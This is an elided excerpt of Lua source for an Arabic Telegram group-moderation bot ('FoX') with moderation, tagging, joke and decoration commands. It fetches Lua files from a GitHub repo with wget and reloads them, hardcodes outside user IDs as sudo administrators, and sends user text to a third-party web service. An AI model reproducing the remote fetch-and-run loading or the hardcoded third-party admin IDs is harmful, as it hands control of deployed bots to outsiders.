...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Source-FoX/FoX-Files/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1200805273,798700870,1106841643}   
...
var = true 
elseif tonumber(user_id) == tonumber(1106841643) then
var = true 
...
send(msg.chat_id_, msg.id_,FoX_Msg) 
return false  
end 
if text then    
...
local FoX1_Msg = database:get(bot_id.."FoX1:Add:Filter:Rp2"..text..msg.chat_id_)   
if FoX1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✤┇ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'IIIIlI8')..') \n ✤┇ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,hsony)
x = 0
tags = 0
local list = hsony.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Source-FoX/FoX-Files/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✤┇ اهلا بك في متجر ملفات فوكس\n ✤┇ ملفات السورس ↓\n❮┉┉┉┉┉𝙁𝙓┉┉┉┉┉❯\n\n"
local TextE = "\n❮┉┉┉┉┉𝙁𝙓┉┉┉┉┉❯\n ✤┇ علامة تعني { ✓ } ملف مفعل\n ✤┇ علامة تعني { ✘ } ملف معطل\n ✤┇ قناة سورس فوكس ↓\n".." ✤┇ [اضغط هنا لدخول](t.me/IIIIlI8) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Source-FoX/FoX-Files/master/File_Bot"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('FoX.lua')  
else
send(msg.chat_id_, msg.id_," ✤┇ عذرا الملف لايدعم سورس فوكس \n") 
end
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✤┇ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'IIIIlI8')..')'
...
send(msg.chat_id_, msg.id_,'['..FoX_Msg[math.random(#FoX_Msg)]..']') 
return false
end
...
local hsony = ' ✤┇ عدد الادمنيه : '..data.administrator_count_..
'\n\n ✤┇ عدد المطرودين : '..data.kicked_count_..
'\n\n ✤┇ عدد الاعضاء : '..data.member_count_..
'\n\n ✤┇ عدد رسائل الكروب : '..(msg.id_/2097152/0.5)..
'\n\n ✤┇  اسم الكروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, hsony) 
end,nil)
end,nil)
end 
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,hsony,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (hsony.total_count_ or 0)
...
local rdphoto = hsonya[math.random(#hsonya)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, hsony.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
hsony = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,hsony)  
...
hsony = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,hsony)  
...
*✤م10 ◂ اوامر الاعضاء*
ٴ❮┉┉┉┉┉𝙁𝙓┉┉┉┉┉❯ٴ
ᶠᵒˣ .[FoX 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/IIIIlI8)ᥫ᭡
]]
...
database:set(bot_id.." hsony:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✤┇ تم تفعيل الزخرفه')
database:set(bot_id.." hsony:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." hsony:zhrf_Bots"..msg.chat_id_) == "open" then
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = https.request('https://rudi-dev.tk/hsony1/FoX.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n✤┇ قائمه الزخرفه \nٴ✤┇ٴ❮┉┉┉┉┉𝙁𝙓┉┉┉┉┉❯ٴ✤┇○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ✤┇ٴ❮┉┉┉┉┉𝙁𝙓┉┉┉┉┉❯ٴ✤┇○ٴ\n✤┇ ᶠᵒˣ .[FoX 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/IIIIlI8)ᥫ᭡')
end
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, '✤┇ تم تعطيل الابراج')
database:set(bot_id.." hsony:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✤┇ تم تفعيل الابراج')
database:set(bot_id.." hsony:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." hsony:brj_Bots"..msg.chat_id_) == "open" then
local Textbrj = text:match("^برج (.*)$")
gk = https.request('https://rudi-dev.tk/hsony2/FoX.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
database:set(bot_id.." hsony:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '✤┇ تم تعطيل حساب العمر')
database:set(bot_id.." hsony:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." hsony:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." hsony:age_Bots"..msg.chat_id_) == "open" then
local Textage = text:match("^احسب (.*)$")
ge = https.request('https://rudi-dev.tk/hsony3/FoX.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فوكس')
...
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','متطا احب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب حسونن وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
...
if text == "نسبه انوثه" or text == "نسبه الانوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":anos_Bots"..msg.chat_id_,"sendanos")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه رجولته \n مثال شهد'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه انوثه" and database:get(bot_id..":"..msg.sender_user_id_..":anos_Bots"..msg.chat_id_) == "sendanos" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","3","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
